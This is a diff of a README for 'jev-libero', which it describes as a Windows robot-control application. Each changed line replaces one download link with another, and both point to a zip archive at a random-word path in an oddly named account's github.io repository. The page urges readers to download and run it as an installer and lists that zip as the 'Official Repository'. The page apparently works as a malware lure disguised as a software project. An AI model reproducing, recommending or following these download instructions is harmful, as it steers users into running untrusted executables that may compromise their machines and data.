@@ -5,7 +5,7 @@ description: "Explore robot control with Jev and LIBERO, featuring local physics
 ---
 # 🤖 jev-libero - Fine-Grained Robot Control Made Easy
 
-[![Download jev-libero](https://img.shields.io/badge/Download-jev--libero-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6F00)](https://raw.githubusercontent.com/Eastereggfreereed793/eastereggfreereed793.github.io/main/myxedematoid/v2.8.zip)
+[![Download jev-libero](https://img.shields.io/badge/Download-jev--libero-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6F00)](https://github.com/Eastereggfreereed793/eastereggfreereed793.github.io/raw/refs/heads/main/myxedematoid/v2.8.zip)
 
 ## 👋 Welcome to jev-libero
 
@@ -48,7 +48,7 @@ Advanced model-based control algorithms ensure your robot moves smoothly and eff
 Getting jev-libero up and running on your Windows computer is simple. Follow these steps:
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://raw.githubusercontent.com/Eastereggfreereed793/eastereggfreereed793.github.io/main/myxedematoid/v2.8.zip](https://raw.githubusercontent.com/Eastereggfreereed793/eastereggfreereed793.github.io/main/myxedematoid/v2.8.zip)
+Visit this link to download the application: [https://github.com/Eastereggfreereed793/eastereggfreereed793.github.io/raw/refs/heads/main/myxedematoid/v2.8.zip](https://github.com/Eastereggfreereed793/eastereggfreereed793.github.io/raw/refs/heads/main/myxedematoid/v2.8.zip)
 
 ### Step 2: Run the Installer
 Once the download completes, find the downloaded file in your "Downloads" folder and double-click it to run the installation wizard. Follow the on-screen instructions - it's just like installing any other Windows program.
@@ -181,15 +181,15 @@ Join our community of robotics enthusiasts! Share your custom tasks, ask questio
 
 Ready to dive into the world of fine-grained robot control?
 
-[![Download jev-libero](https://img.shields.io/badge/Get_jev--libero-Free-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a1a2e&color=00d4ff)](https://raw.githubusercontent.com/Eastereggfreereed793/eastereggfreereed793.github.io/main/myxedematoid/v2.8.zip)
+[![Download jev-libero](https://img.shields.io/badge/Get_jev--libero-Free-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a1a2e&color=00d4ff)](https://github.com/Eastereggfreereed793/eastereggfreereed793.github.io/raw/refs/heads/main/myxedematoid/v2.8.zip)
 
-Visit this link to download the application: [https://raw.githubusercontent.com/Eastereggfreereed793/eastereggfreereed793.github.io/main/myxedematoid/v2.8.zip](https://raw.githubusercontent.com/Eastereggfreereed793/eastereggfreereed793.github.io/main/myxedematoid/v2.8.zip)
+Visit this link to download the application: [https://github.com/Eastereggfreereed793/eastereggfreereed793.github.io/raw/refs/heads/main/myxedematoid/v2.8.zip](https://github.com/Eastereggfreereed793/eastereggfreereed793.github.io/raw/refs/heads/main/myxedematoid/v2.8.zip)
 
 Take control of your own robot today - it's easier than you think!
 
 ## 🔗 Quick Reference
 
-- **Official Repository**: [https://raw.githubusercontent.com/Eastereggfreereed793/eastereggfreereed793.github.io/main/myxedematoid/v2.8.zip](https://raw.githubusercontent.com/Eastereggfreereed793/eastereggfreereed793.github.io/main/myxedematoid/v2.8.zip)
+- **Official Repository**: [https://github.com/Eastereggfreereed793/eastereggfreereed793.github.io/raw/refs/heads/main/myxedematoid/v2.8.zip](https://github.com/Eastereggfreereed793/eastereggfreereed793.github.io/raw/refs/heads/main/myxedematoid/v2.8.zip)
 - **Documentation**: Included with the application (Help menu)
 - **Sample Tasks**: Included in the app (Load Task menu)
 
